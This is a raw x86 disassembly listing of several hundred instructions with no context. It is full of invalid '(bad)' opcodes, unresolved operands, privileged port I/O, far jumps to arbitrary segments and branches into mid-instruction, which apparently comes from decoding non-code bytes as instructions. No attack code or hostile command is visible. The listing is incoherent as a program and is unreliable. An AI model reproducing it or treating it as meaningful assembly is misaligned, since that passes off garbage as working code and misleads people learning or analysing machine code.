  6b6b79:	test   DWORD PTR [ecx-0x60801ac],eax
  6b6b7f:	jnp    0x6b6bf5
  6b6b81:	mov    edx,DWORD PTR [ebx]
  6b6b83:	nop
  6b6b84:	ret    
  6b6b85:	repz neg bl
  6b6b88:	jns    0x6b6b96
  6b6b8a:	push   eax
  6b6b8b:	leave  
  6b6b8c:	mov    ecx,0x9b316f9b
  6b6b91:	ins    DWORD PTR es:[edi],dx
  6b6b92:	fsub   st,st(4)
  6b6b94:	dec    esp
  6b6b95:	clc    
  6b6b96:	lahf   
  6b6b97:	addr16 mov edi,0xb56a5ab1
  6b6b9d:	push   eax
  6b6b9e:	and    al,0x7
  6b6ba0:	loope  0x6b6b49
  6b6ba2:	and    DWORD PTR ds:0x6899fa84,ecx
  6b6ba8:	mov    DWORD PTR [edx-0x454be87a],ebp
  6b6bae:	sbb    BYTE PTR [ecx],ch
  6b6bb0:	inc    esp
  6b6bb1:	dec    esp
  6b6bb2:	int    0x2e
  6b6bb4:	pop    eax
  6b6bb5:	mov    al,ds:0x8725189b
  6b6bba:	pop    ss
  6b6bbb:	and    esi,esp
  6b6bbd:	add    al,0x41
  6b6bbf:	fstp   TBYTE PTR [ebp+eiz*8-0x39289f4]
  6b6bc6:	jp     0x6b6bd6
  6b6bc8:	sbb    BYTE PTR [ebx+0x7f],dh
  6b6bcb:	(bad)  
  6b6bcc:	shl    BYTE PTR [ecx],1
  6b6bce:	and    DWORD PTR [ebp+edx*2-0x24605b22],0xfa124fee
  6b6bd9:	sub    al,0x54
  6b6bdb:	and    BYTE PTR [ecx],dh
  6b6bdd:	es dec ebp
  6b6bdf:	jmp    0x196bafe9
  6b6be4:	stos   DWORD PTR es:[edi],eax
  6b6be5:	sbb    ah,bh
  6b6be7:	sub    eax,DWORD PTR [esi]
  6b6be9:	popw   ds
  6b6beb:	pop    ecx
  6b6bec:	mov    DWORD PTR [eax-0x3f1a53b4],0x268d75e6
  6b6bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b6bf7:	xor    al,0x15
  6b6bf9:	leave  
  6b6bfa:	inc    ebp
  6b6bfb:	out    0xa4,al
  6b6bfd:	dec    ebp
  6b6bfe:	lahf   
  6b6bff:	dec    edi
  6b6c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6c01:	das    
  6b6c02:	mov    dh,0xa7
  6b6c04:	fwait
  6b6c05:	std    
  6b6c06:	inc    ebp
  6b6c07:	nop
  6b6c08:	jb     0x6b6c53
  6b6c0a:	add    DWORD PTR [esi+0x5d],edx
  6b6c0d:	xor    ch,BYTE PTR ds:0x4c9acba1
  6b6c13:	pop    edx
  6b6c14:	or     DWORD PTR [edi+0x34771fa3],edi
  6b6c1a:	jns    0x6b6c84
  6b6c1c:	out    0x4e,eax
  6b6c1e:	mov    bh,0xac
  6b6c20:	pop    eax
  6b6c21:	or     esp,DWORD PTR [edx]
  6b6c23:	pop    es
  6b6c24:	xor    DWORD PTR [ebx-0x61],edx
  6b6c27:	push   edx
  6b6c28:	in     al,dx
  6b6c29:	shr    ah,1
  6b6c2b:	outs   dx,DWORD PTR ds:[esi]
  6b6c2c:	mov    bl,0xbe
  6b6c2e:	cmp    BYTE PTR [eax+0x23],0x7c
  6b6c32:	sbb    al,0xdf
  6b6c34:	js     0x6b6bc9
  6b6c36:	jno    0x6b6cad
  6b6c38:	add    DWORD PTR [ecx-0x4499e8be],0xed3d2408
  6b6c42:	mov    WORD PTR [eax-0x6],es
  6b6c45:	push   esi
  6b6c46:	or     ah,bh
  6b6c48:	and    edx,DWORD PTR [ebp+ecx*8+0x36e589fa]
  6b6c4f:	xchg   ebx,eax
  6b6c50:	pushf  
  6b6c51:	lods   al,BYTE PTR ds:[esi]
  6b6c52:	(bad)  
  6b6c53:	fsub   QWORD PTR [eax-0x1]
  6b6c56:	sbb    ebx,DWORD PTR [ebp+0x45]
  6b6c59:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  6b6c5b:	sub    eax,0xe8ac282b
  6b6c60:	mov    cl,0x59
  6b6c62:	rol    DWORD PTR [eax],cl
  6b6c64:	enter  0xa2fe,0x8f
  6b6c68:	xor    al,0xb1
  6b6c6a:	jae    0x6b6c2f
  6b6c6c:	jmp    0x6b6c84
  6b6c6e:	out    dx,al
  6b6c6f:	cld    
  6b6c70:	scas   eax,DWORD PTR es:[edi]
  6b6c71:	div    DWORD PTR [edi+esi*4-0x4685c2a9]
  6b6c78:	dec    edx
  6b6c79:	push   ss
  6b6c7a:	cld    
  6b6c7b:	arpl   bx,dx
  6b6c7d:	mov    esi,0x6730c785
  6b6c82:	sbb    al,0xd
  6b6c84:	cmp    al,0xc0
  6b6c86:	sbb    dh,bh
  6b6c88:	jns    0x6b6ced
  6b6c8a:	jl     0x6b6c46
  6b6c8c:	loope  0x6b6c38
  6b6c8e:	icebp  
  6b6c8f:	stos   DWORD PTR es:[edi],eax
  6b6c90:	sbb    al,0x2
  6b6c92:	cmp    ah,ah
  6b6c94:	sub    BYTE PTR [ebx],bl
  6b6c96:	dec    ebx
  6b6c97:	test   edx,eax
  6b6c99:	cmp    eax,0x5065ef1f
  6b6c9e:	shl    BYTE PTR [ebp+0x1e],0x31
  6b6ca2:	jae    0x6b6ca1
  6b6ca4:	leave  
  6b6ca5:	loope  0x6b6cc9
  6b6ca7:	jg     0x6b6c2d
  6b6ca9:	inc    edx
  6b6caa:	mov    edx,0xe2a1255e
  6b6caf:	jl     0x6b6cd2
  6b6cb1:	sub    ah,ch
  6b6cb3:	in     al,dx
  6b6cb4:	in     eax,0xce
  6b6cb6:	repnz jecxz 0x6b6c8a
  6b6cb9:	push   cs
  6b6cba:	inc    edi
  6b6cbb:	xchg   ecx,eax
  6b6cbc:	repnz xlat BYTE PTR ds:[ebx]
  6b6cbe:	sub    edi,DWORD PTR ds:0xe2409e48
  6b6cc4:	test   eax,0xaeb21ca1
  6b6cc9:	and    DWORD PTR [ebp-0x1c],ecx
  6b6ccc:	xchg   edx,eax
  6b6ccd:	xor    bh,ah
  6b6ccf:	cmp    DWORD PTR [edx+0x21f48064],edi
  6b6cd5:	loop   0x6b6d50
  6b6cd7:	xchg   edx,eax
  6b6cd8:	cmp    cl,BYTE PTR [ecx+0x4bf9cc2a]
  6b6cde:	xor    DWORD PTR [edi],esp
  6b6ce0:	push   eax
  6b6ce1:	daa    
  6b6ce2:	pop    esi
  6b6ce3:	aad    0x86
  6b6ce5:	aaa    
  6b6ce6:	fcomi  st,st(3)
  6b6ce8:	(bad)  
  6b6ce9:	xchg   DWORD PTR [esp+edi*2-0x27db2c7a],esi
  6b6cf0:	(bad)  
  6b6cf1:	mov    ch,0xe
  6b6cf3:	mov    edx,DWORD PTR [edx+0x73c65d]
  6b6cf9:	jg     0x6b6c80
  6b6cfb:	cld    
  6b6cfc:	inc    ebx
  6b6cfd:	cmp    BYTE PTR [ecx-0x14],dl
  6b6d00:	sub    esp,DWORD PTR [edx+0x4cf96b57]
  6b6d06:	pop    ss
  6b6d07:	neg    DWORD PTR [esp+esi*1-0x7a]
  6b6d0b:	pop    ebx
  6b6d0c:	bound  ebx,QWORD PTR [ecx]
  6b6d0e:	and    DWORD PTR [ebp-0x75a05425],edx
  6b6d14:	pushf  
  6b6d15:	or     eax,0xcaf31f6a
  6b6d1a:	mov    eax,ds:0x54570106
  6b6d1f:	xlat   BYTE PTR ds:[ebx]
  6b6d20:	xchg   BYTE PTR [ebx],bh
  6b6d22:	mov    WORD PTR [ecx+0x5e0b43c],?
  6b6d28:	or     eax,0x1fd24b59
  6b6d2d:	inc    ebp
  6b6d2e:	mov    ebx,DWORD PTR [eax+eax*8+0x784eec73]
  6b6d35:	push   cs
  6b6d36:	rcr    DWORD PTR [edi+eiz*8+0x786abdd0],1
  6b6d3d:	and    eax,0xc4880f8f
  6b6d42:	mov    bl,0x10
  6b6d44:	ret    
  6b6d45:	jns    0x6b6dba
  6b6d47:	fidivr DWORD PTR [ebx]
  6b6d49:	(bad)  
  6b6d4a:	test   BYTE PTR [edx+ebx*4-0x33019b1],ah
  6b6d51:	mov    bl,0x99
  6b6d53:	sub    DWORD PTR [esi],esi
  6b6d55:	cmc    
  6b6d56:	sub    DWORD PTR [edi-0x6f611d28],ebx
  6b6d5c:	pop    edx
  6b6d5d:	add    edx,edi
  6b6d5f:	adc    eax,0xfcdd35a7
  6b6d64:	jmp    DWORD PTR [ecx+0x3da131dd]
  6b6d6a:	add    eax,0x9b94f7ba
  6b6d6f:	mov    ss,edi
  6b6d71:	arpl   WORD PTR [eax+esi*8-0x45726524],dx
  6b6d78:	cwde   
  6b6d79:	fisub  DWORD PTR [edi+0x20]
  6b6d7c:	xor    BYTE PTR [ebx-0x122ef4c8],al
  6b6d82:	mov    dl,0xa7
  6b6d84:	mov    bl,0x9
  6b6d86:	mov    dl,0x36
  6b6d88:	xchg   esp,eax
  6b6d89:	add    ecx,0xffffffdc
  6b6d8c:	or     BYTE PTR [ecx],al
  6b6d8e:	mov    cl,0x7a
  6b6d90:	mov    edx,0x2c042b15
  6b6d95:	jmp    0x6b6d55
  6b6d97:	data16 arpl dx,si
  6b6d9a:	sbb    BYTE PTR [ebx-0x6c4e97cf],bh
  6b6da0:	xchg   ebx,eax
  6b6da1:	mov    ebx,0x98e379ef
  6b6da6:	lds    esp,FWORD PTR [ebx-0x2e]
  6b6da9:	push   es
  6b6daa:	inc    esp
  6b6dab:	aas    
  6b6dac:	mov    edx,DWORD PTR [ebp-0x21]
  6b6daf:	clc    
  6b6db0:	mov    ah,0x6
  6b6db2:	icebp  
  6b6db3:	cmp    BYTE PTR [edi+0x6d622496],bl
  6b6db9:	xor    esi,DWORD PTR [ecx-0x3afb90fd]
  6b6dbf:	ror    BYTE PTR [ebp+0x317af332],cl
  6b6dc5:	jle    0x6b6d89
  6b6dc7:	ret    
  6b6dc8:	add    DWORD PTR [eax],ecx
  6b6dca:	push   ds
  6b6dcb:	push   ebx
  6b6dcc:	mov    edi,0x1ccbc8a8
  6b6dd1:	sbb    eax,0x657c02e1
  6b6dd6:	push   cs
  6b6dd7:	test   eax,0x72f8a5d3
  6b6ddc:	das    
  6b6ddd:	pushf  
  6b6dde:	cmp    ebp,edi
  6b6de0:	xor    ah,BYTE PTR [esi+esi*1+0x65]
  6b6de4:	xchg   esp,eax
  6b6de5:	std    
  6b6de6:	pop    esi
  6b6de7:	cmp    ebp,DWORD PTR [edi+0x53]
  6b6dea:	pop    ebp
  6b6deb:	js     0x6b6de2
  6b6ded:	shl    BYTE PTR [ebx+0x7f5b1907],0x54
  6b6df4:	dec    edx
  6b6df5:	inc    edi
  6b6df6:	fiadd  DWORD PTR [esi]
  6b6df8:	xor    eax,0xdc3ccac7
  6b6dfd:	mov    eax,0x724a964a
  6b6e02:	sub    DWORD PTR [ecx],eax
  6b6e04:	adc    DWORD PTR [ecx],eax
  6b6e06:	cmp    ch,0xfa
  6b6e09:	fldcw  WORD PTR [esp+ebx*2+0x4577d2ca]
  6b6e10:	add    DWORD PTR [ebx+ecx*8],eax
  6b6e13:	mov    ebx,0xae9f1735
  6b6e18:	stc    
  6b6e19:	repz pop edi
  6b6e1b:	fsub   QWORD PTR [edx-0x17]
  6b6e1e:	test   BYTE PTR [ebx],al
  6b6e20:	xor    BYTE PTR [edi+eax*2],ah
  6b6e23:	mov    cl,0x24
  6b6e25:	inc    edi
  6b6e26:	xor    eax,0x99cd1e0d
  6b6e2b:	pop    ss
  6b6e2c:	pusha  
  6b6e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b6e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6e2f:	mov    bh,0x41
  6b6e31:	pop    edi
  6b6e32:	enter  0xbcb0,0xce
  6b6e36:	dec    eax
  6b6e37:	out    0xd5,eax
  6b6e39:	popa   
  6b6e3a:	jp     0x6b6dfe
  6b6e3c:	xor    DWORD PTR [ebx],0x4d6d210a
  6b6e42:	sbb    eax,ecx
  6b6e44:	sbb    DWORD PTR [edi+0x47],0xd1f13d77
  6b6e4b:	lds    edi,FWORD PTR [edx-0x3]
  6b6e4e:	test   eax,0x48a807d8
  6b6e53:	stos   DWORD PTR es:[edi],eax
  6b6e54:	pushf  
  6b6e55:	repz jbe 0x6b6e5f
  6b6e58:	push   ebp
  6b6e59:	fisttp QWORD PTR [edi-0x4d70981b]
  6b6e5f:	and    esp,DWORD PTR [edi]
  6b6e61:	xchg   edx,eax
  6b6e62:	and    esp,ecx
  6b6e64:	adc    ebx,DWORD PTR [ecx]
  6b6e66:	cld    
  6b6e67:	iret   
  6b6e68:	call   0xfafad612
  6b6e6d:	add    eax,0xdfa2a7c
  6b6e72:	pop    ecx
  6b6e73:	pop    ebp
  6b6e74:	sub    eax,0xd35c4ded
  6b6e79:	ret    
  6b6e7a:	mov    bl,0x4f
  6b6e7c:	inc    ebx
  6b6e7d:	mul    BYTE PTR [ebp-0x3fb4175d]
  6b6e83:	mov    al,0x29
  6b6e85:	cli    
  6b6e86:	push   edi
  6b6e87:	push   edx
  6b6e88:	jb     0x6b6e62
  6b6e8a:	pop    eax
  6b6e8b:	ins    BYTE PTR es:[edi],dx
  6b6e8c:	imul   ebx,DWORD PTR [ebp-0x68c8ec54],0xffffffa8
  6b6e93:	jle    0x6b6e20
  6b6e95:	rol    eax,1
  6b6e97:	push   edx
  6b6e98:	adc    dl,BYTE PTR [eax+0x19]
  6b6e9b:	xchg   ah,dl
  6b6e9d:	jbe    0x6b6efe
  6b6e9f:	ss enter 0x680,0x22
  6b6ea4:	pop    ds
  6b6ea5:	outs   dx,DWORD PTR ds:[esi]
  6b6ea6:	rcr    DWORD PTR [ecx+0x2b],cl
  6b6ea9:	inc    edx
  6b6eaa:	retf   
  6b6eab:	jecxz  0x6b6f15
  6b6ead:	repnz idiv BYTE PTR [eax]
  6b6eb0:	inc    ecx
  6b6eb1:	dec    eax
  6b6eb2:	fisubr DWORD PTR [edi+0x7e]
  6b6eb5:	xchg   ecx,eax
  6b6eb6:	arpl   di,ax
  6b6eb8:	rcl    DWORD PTR [ebp+0x2e],1
  6b6ebb:	test   al,0x97
  6b6ebd:	push   0xffffffb4
  6b6ebf:	retf   
  6b6ec0:	or     al,0xff
  6b6ec2:	sub    DWORD PTR [ebp+edx*2+0x7f8cac2],ecx
  6b6ec9:	(bad)  
  6b6eca:	pushf  
  6b6ecb:	loopne 0x6b6eea
  6b6ecd:	loopne 0x6b6e72
  6b6ecf:	add    BYTE PTR [edx+edi*1-0x7b4d8232],dh
  6b6ed6:	rcl    BYTE PTR [eax],1
  6b6ed8:	or     ecx,ebp
  6b6eda:	in     eax,0x96
  6b6edc:	mov    ebx,0x3f120c9
  6b6ee1:	inc    edi
  6b6ee2:	ret    0x78f9
  6b6ee5:	lods   eax,DWORD PTR ds:[esi]
  6b6ee6:	jae    0x6b6edc
  6b6ee8:	retf   
  6b6ee9:	outs   dx,BYTE PTR ds:[esi]
  6b6eea:	mov    cl,0xe1
  6b6eec:	jle    0x6b6ef2
  6b6eee:	inc    ebp
  6b6eef:	imul   eax,DWORD PTR [ecx-0x47],0xf0a99eef
  6b6ef6:	add    BYTE PTR [esi+0xa3e08b4],cl
  6b6efc:	xchg   esi,eax
  6b6efd:	adc    esi,edi
  6b6eff:	stc    
  6b6f00:	push   esi
  6b6f01:	in     eax,dx
  6b6f02:	std    
  6b6f03:	and    edi,DWORD PTR [ebp-0x5f]
  6b6f06:	push   ebp
  6b6f07:	je     0x6b6f53
  6b6f09:	sub    bh,BYTE PTR [esi-0x15]
  6b6f0c:	stc    
  6b6f0d:	xchg   ebx,ecx
  6b6f0f:	mov    ds:0x48b6102b,eax
  6b6f14:	mov    ecx,DWORD PTR [edx-0x5c]
  6b6f17:	mov    DWORD PTR [esi],edi
  6b6f19:	(bad)  
  6b6f1a:	xchg   esi,eax
  6b6f1b:	inc    ecx
  6b6f1c:	aaa    
  6b6f1d:	out    0x6e,eax
  6b6f1f:	push   esp
  6b6f20:	repnz pop ds
  6b6f22:	loop   0x6b6f41
  6b6f24:	cmp    ecx,DWORD PTR [ebp+0x67]
  6b6f27:	add    BYTE PTR [ebp+esi*2+0x7f],cl
  6b6f2b:	cmp    ah,al
  6b6f2d:	and    BYTE PTR ds:0x67c41e82,0xd7
  6b6f34:	jge    0x6b6f84
  6b6f36:	mov    al,0xcb
  6b6f38:	push   edi
  6b6f39:	cmp    eax,0xc4eaf695
  6b6f3e:	pop    edx
  6b6f3f:	adc    BYTE PTR [ebx+0x40d31242],ah
  6b6f45:	fs (bad) 
  6b6f47:	in     eax,dx
  6b6f48:	pop    ss
  6b6f49:	push   0xbfbafe45
  6b6f4e:	push   ecx
  6b6f4f:	mov    ch,0x5a
  6b6f51:	inc    ebx
  6b6f52:	mov    bh,0x91
  6b6f54:	sbb    al,0x3c
  6b6f56:	push   eax
  6b6f57:	imul   esi,DWORD PTR [edi+0x30836f2d],0xf6d7e96e
  6b6f61:	dec    ebp
  6b6f62:	ret    
  6b6f63:	and    al,BYTE PTR [edi]
  6b6f65:	test   BYTE PTR [eax-0x2f9a523],dh
  6b6f6b:	call   0xd277:0x9c52997c
  6b6f72:	xor    BYTE PTR [eax-0x75ef76f5],0xd5
  6b6f79:	mov    ebp,0x41502bc8
  6b6f7e:	imul   esi,esi,0xaee9dcf2
  6b6f84:	ret    
  6b6f85:	mov    esi,0x69bd7be7
  6b6f8a:	jmp    0x6b6f66
  6b6f8c:	test   DWORD PTR ds:0xeac944f1,edi
  6b6f92:	push   esi
  6b6f93:	ss mov bl,0xac
  6b6f96:	pop    es
  6b6f97:	push   es
  6b6f98:	cmp    BYTE PTR [eax],dl
  6b6f9a:	or     BYTE PTR [edi-0x6e],ch
  6b6f9d:	and    eax,0xbaae3817
  6b6fa2:	sbb    al,BYTE PTR [eax-0x22]
  6b6fa5:	jns    0x6b6f91
  6b6fa7:	loope  0x6b6fdb
  6b6fa9:	aad    0x1c
  6b6fab:	loopne 0x6b6fcc
  6b6fad:	out    0xba,al
  6b6faf:	and    eax,0xf220d04d
  6b6fb4:	mov    esp,0xb5751733
  6b6fb9:	js     0x6b6fa4
  6b6fbb:	stc    
  6b6fbc:	jae    0x6b6f75
  6b6fbe:	mov    ds:0x7003b978,eax
  6b6fc3:	mov    ebp,0x841b5794
  6b6fc8:	shl    DWORD PTR [ebp-0x64a1715b],0x60
  6b6fcf:	mov    cl,0x41
  6b6fd1:	call   0xf785:0x57645bd1
  6b6fd8:	loope  0x6b7026
  6b6fda:	je     0x6b6fb9
  6b6fdc:	pushf  
  6b6fdd:	mov    esp,0x2a76a962
  6b6fe2:	mov    dh,0x13
  6b6fe4:	push   ss
  6b6fe5:	rcr    DWORD PTR [edi+edi*1-0x5ebe7373],cl
  6b6fec:	stos   BYTE PTR es:[edi],al
  6b6fed:	inc    esp
  6b6fee:	es add al,0x16
  6b6ff1:	imul   ebx,DWORD PTR [edx+0x70],0x37
  6b6ff5:	and    al,0xc4
  6b6ff7:	mov    ?,WORD PTR [ebx]
  6b6ff9:	sub    esp,eax
  6b6ffb:	mov    al,0xa9
  6b6ffd:	(bad)  
  6b6ffe:	arpl   WORD PTR [ebx],bp
  6b7000:	fs cs retf 0x68ac
  6b7005:	adc    eax,DWORD PTR [edx-0x3b]
  6b7008:	push   gs
  6b700a:	in     eax,0x73
  6b700c:	mov    eax,ds:0x1feec00c
  6b7011:	in     eax,0x3e
  6b7013:	jb     0x6b7068
  6b7015:	out    dx,eax
  6b7016:	fisubr WORD PTR [esi+0x77]
  6b7019:	(bad)  
  6b701a:	push   edx
  6b701b:	xor    al,0xc0
  6b701d:	stc    
  6b701e:	(bad)  
  6b701f:	dec    esi
  6b7020:	xor    BYTE PTR [ebp-0x1ab33ee3],ch
  6b7026:	mov    ds:0xaf328f74,eax
  6b702b:	xchg   ebx,eax
  6b702c:	je     0x6b7085
  6b702e:	pop    eax
  6b702f:	cmp    dl,dh
  6b7031:	das    
  6b7032:	gs das 
  6b7034:	mov    esp,0x267a51a0
  6b7039:	pop    edi
  6b703a:	dec    ecx
  6b703b:	repnz ror BYTE PTR [edx-0x7d9c0ac8],cl
  6b7042:	adc    al,0xb7
  6b7044:	stos   BYTE PTR es:[edi],al
  6b7045:	retf   
  6b7046:	sub    al,0xa1
  6b7048:	lds    ebx,FWORD PTR [edi+0x28d6785c]
  6b704e:	test   al,0xa4
  6b7050:	mov    dl,0x83
  6b7052:	(bad)  
  6b7053:	cmp    ebx,DWORD PTR [edi+eiz*2-0x1f]
  6b7057:	xchg   esi,eax
  6b7058:	dec    edi
  6b7059:	cmp    DWORD PTR [esp+edx*1],edx
  6b705c:	ins    DWORD PTR es:[edi],dx
  6b705d:	arpl   WORD PTR [ecx+esi*8+0x6a],sp
  6b7061:	bound  edx,QWORD PTR [ecx+eiz*1+0x6f4dda9c]
  6b7068:	neg    al
  6b706a:	int    0x50
  6b706c:	inc    ecx
  6b706d:	xchg   BYTE PTR [ebp-0x6ce2700b],ch
  6b7073:	es push eax
  6b7075:	lods   eax,DWORD PTR ds:[esi]
  6b7076:	into   
  6b7077:	hlt    
  6b7078:	sti    
  6b7079:	lods   al,BYTE PTR ds:[esi]
  6b707a:	ret    0xb87e
  6b707d:	xchg   esi,eax
  6b707e:	cwde   
  6b707f:	mov    DWORD PTR [ecx-0x37],esp
  6b7082:	mov    ch,0x11
  6b7084:	add    al,0xb9
  6b7086:	in     eax,0xd1
  6b7088:	dec    edi
  6b7089:	xchg   BYTE PTR [edi-0x76d9b251],dl
  6b708f:	inc    edi
  6b7090:	call   0xa2683585
  6b7095:	push   es
  6b7096:	ss (bad) 
  6b7098:	xchg   esp,eax
  6b7099:	or     al,BYTE PTR [eax]
  6b709b:	ja     0x6b70dc
  6b709d:	int    0xeb
  6b709f:	sti    
  6b70a0:	bswap  esi
  6b70a2:	ins    BYTE PTR es:[edi],dx
  6b70a3:	lock push eax
  6b70a5:	(bad)  
  6b70a7:	lods   al,BYTE PTR ds:[esi]
  6b70a8:	or     DWORD PTR [ecx],edi
  6b70aa:	sub    eax,0xf86f0dc7
  6b70af:	hlt    
  6b70b0:	int3   
  6b70b1:	lea    ecx,[ecx]
  6b70b3:	(bad)  
  6b70b4:	mov    bl,0xd4
  6b70b6:	jo     0x6b70cb
  6b70b8:	popf   
  6b70b9:	add    al,al
  6b70bb:	or     al,0x9
  6b70bd:	data16 cmp ah,bh
  6b70c0:	jbe    0x6b709f
  6b70c2:	adc    eax,0xa842cc57
  6b70c7:	mov    eax,ds:0x3c79adbd
  6b70cc:	daa    
  6b70cd:	es push eax
  6b70cf:	jmp    0x753e0f5c
  6b70d4:	xchg   edx,eax
  6b70d5:	push   cs
  6b70d6:	mov    eax,0x5d8dff1e
  6b70db:	cld    
  6b70dc:	ds je  0x6b7097
  6b70df:	jge    0x6b70a0
  6b70e1:	xor    dl,BYTE PTR [eax+0x62ecccb2]
  6b70e7:	ja     0x6b7123
  6b70e9:	inc    edx
  6b70ea:	pop    ds
  6b70eb:	pop    edi
  6b70ec:	ss dec esp
  6b70ee:	mov    esi,0x4d2a4cd5
  6b70f3:	test   eax,0x10d1d654
  6b70f8:	and    eax,0x5986a95d
  6b70fd:	mul    BYTE PTR [ebp+0x18d98f20]
  6b7103:	mov    ds,WORD PTR [ebx]
  6b7105:	sbb    eax,DWORD PTR [ebx+0x5a622740]
  6b710b:	je     0x6b7109
  6b710d:	loope  0x6b715b
  6b710f:	fadd   DWORD PTR [ecx+0x1c]
  6b7112:	mov    esp,0xbe929145
  6b7117:	adc    BYTE PTR [ebx-0x260c4f37],ah
  6b711d:	int3   
  6b711e:	out    dx,eax
  6b711f:	test   DWORD PTR [ecx],eax
  6b7121:	push   esi
  6b7122:	cs aad 0x50
  6b7125:	mov    dl,0xd6
  6b7127:	mov    al,ds:0xb7362abd
  6b712c:	fwait
  6b712d:	adc    esi,DWORD PTR [ebx+0x10e1581]
  6b7133:	dec    edx
  6b7134:	inc    esi
  6b7135:	pusha  
  6b7136:	mov    ah,0x5a
  6b7138:	(bad)  
  6b713a:	add    dh,BYTE PTR [edi-0x20]
  6b713d:	mov    cl,0x80
  6b713f:	push   eax
  6b7140:	mov    bh,0xeb
  6b7142:	push   esi
  6b7143:	sti    
  6b7144:	mov    ecx,0x11b38667
  6b7149:	push   cs
  6b714a:	int    0xc8
  6b714c:	data16 aas 
  6b714e:	int3   
  6b714f:	or     ah,bh
  6b7151:	fwait
  6b7152:	js     0x6b7140
  6b7154:	xchg   esi,eax
  6b7155:	cmp    ah,BYTE PTR [ebp-0x14]
  6b7158:	cmp    edx,eax
  6b715a:	inc    esi
  6b715b:	repnz sbb eax,0xb1235a73
  6b7161:	fadd   QWORD PTR [edi+0x30b94b9f]
  6b7167:	fistp  DWORD PTR [ebx-0x28]
  6b716a:	cmp    al,al
  6b716c:	fdiv   DWORD PTR [esi]
  6b716e:	mov    ebx,0x14d2a738
  6b7173:	push   edx
  6b7174:	pop    esp
  6b7175:	ret    
  6b7176:	sbb    BYTE PTR [ebx-0x6e],al
  6b7179:	mov    cl,0xc0
  6b717b:	stos   DWORD PTR es:[edi],eax
  6b717c:	in     al,0xb9
  6b717e:	ret    
  6b717f:	outs   dx,BYTE PTR ds:[esi]
  6b7180:	aam    0xc
  6b7182:	sbb    bh,BYTE PTR ss:[ebx+0x7b199df3]
  6b7189:	aaa    
  6b718a:	or     ah,BYTE PTR [edi]
  6b718c:	pop    ds
  6b718d:	add    eax,0x8198625c
  6b7192:	xchg   edx,eax
  6b7193:	cdq    
  6b7194:	clc    
  6b7195:	ja     0x6b712d
  6b7197:	jno    0x6b71ab
  6b7199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b719a:	hlt    
  6b719b:	mov    esi,0xf91d6242
  6b71a0:	push   edx
  6b71a1:	mov    esi,0x9a87b691
  6b71a6:	xor    ebp,edx
  6b71a8:	mov    eax,ecx
  6b71aa:	sar    BYTE PTR [eax],cl
  6b71ac:	jmp    0x6b71fd
  6b71ae:	xchg   ebp,eax
  6b71af:	mov    esp,0x404a30a5
  6b71b4:	scas   eax,DWORD PTR es:[edi]
  6b71b5:	lods   eax,DWORD PTR ds:[esi]
  6b71b6:	xchg   DWORD PTR [ecx+ebx*4+0x29],edi
  6b71ba:	hlt    
  6b71bb:	and    dh,BYTE PTR [eax-0x5e5adf9c]
  6b71c1:	clc    
  6b71c2:	xor    eax,0x68ccea3a
  6b71c7:	jbe    0x6b723b
  6b71c9:	sti    
  6b71ca:	push   ebp
  6b71cb:	fcmovne st,st(7)
  6b71cd:	enter  0x3acc,0xcd
  6b71d1:	ret    0xf1f3
  6b71d4:	daa    
  6b71d5:	ins    DWORD PTR es:[edi],dx
  6b71d6:	push   0xd4b78d94
  6b71db:	dec    ebp
  6b71dc:	mov    eax,ds:0xbde7b2ba
  6b71e1:	dec    ebx
  6b71e2:	loopne 0x6b7208
  6b71e4:	dec    eax
  6b71e5:	mov    ah,0x0
  6b71e7:	cmp    DWORD PTR [ebx],ebp
  6b71e9:	outs   dx,DWORD PTR ds:[esi]
  6b71ea:	cmp    bl,BYTE PTR [edx-0x349f6d]
  6b71f0:	mov    al,BYTE PTR [edx-0x36]
  6b71f3:	dec    ebx
  6b71f4:	mov    ebp,0x666b67fc
  6b71f9:	xchg   ecx,eax
  6b71fa:	xchg   edx,eax
  6b71fb:	addr16 call 0xe6f:0xdfc86746
  6b7203:	fcom   DWORD PTR [edx-0x20]
  6b7206:	add    edi,0xeb635cfb
  6b720c:	cmp    eax,0x350063af
  6b7211:	(bad)  
  6b7212:	cld    
  6b7213:	mov    al,0x95
  6b7215:	data16 sbb dl,bl
  6b7218:	sub    edi,DWORD PTR ds:0xab3efb04
  6b721e:	(bad)  
  6b721f:	fisttp WORD PTR [ecx]
  6b7221:	inc    esi
  6b7222:	fcmovne st,st(4)
  6b7224:	or     DWORD PTR [edi],0x2d
  6b7227:	in     eax,0xbc
  6b7229:	stc    
  6b722a:	ins    BYTE PTR es:[edi],dx
  6b722b:	dec    esp
  6b722c:	dec    edi
  6b722d:	iret   
  6b722e:	pop    ebp
  6b722f:	jmp    0x6b7203
  6b7231:	dec    eax
  6b7232:	imul   DWORD PTR [ebx]
  6b7234:	push   edi
  6b7235:	or     eax,0x5379f3c9
  6b723a:	xchg   DWORD PTR [ecx-0x40],ebx
  6b723d:	(bad)  
  6b723f:	pop    ebx
  6b7240:	sbb    edi,DWORD PTR [edi+0x5bf9b3b8]
  6b7246:	loope  0x6b727f
  6b7248:	sbb    eax,0x6522dc80
  6b724d:	outs   dx,DWORD PTR ds:[esi]
  6b724e:	push   0x34
  6b7250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b7251:	lahf   
  6b7252:	push   ds
  6b7253:	arpl   si,sp
  6b7255:	test   al,0x78
  6b7257:	xor    ah,BYTE PTR [eiz*8+0x37b72213]
  6b725e:	sbb    eax,0x5e70d3bf
  6b7263:	sub    BYTE PTR [ecx+0x54],bh
  6b7266:	jmp    0x3810:0x31167bf8
  6b726d:	addr16 (bad) 
  6b726f:	jg     0x6b725d
  6b7271:	push   esi
  6b7272:	cld    
  6b7273:	mov    ah,0x55
  6b7275:	jmp    0x6b72d4
  6b7277:	jno    0x6b72f2
  6b7279:	sub    BYTE PTR [edi+esi*4-0x43],al
  6b727d:	pop    ss
  6b727e:	lods   al,BYTE PTR ds:[esi]
  6b727f:	int    0xdd
  6b7281:	mov    ds:0xa8b5e350,eax
  6b7286:	repz or al,0xd
  6b7289:	mov    bl,0x23
  6b728b:	in     eax,dx
  6b728c:	mov    bh,0xa2
  6b728e:	repnz std 
  6b7290:	jbe    0x6b72a9
  6b7292:	std    
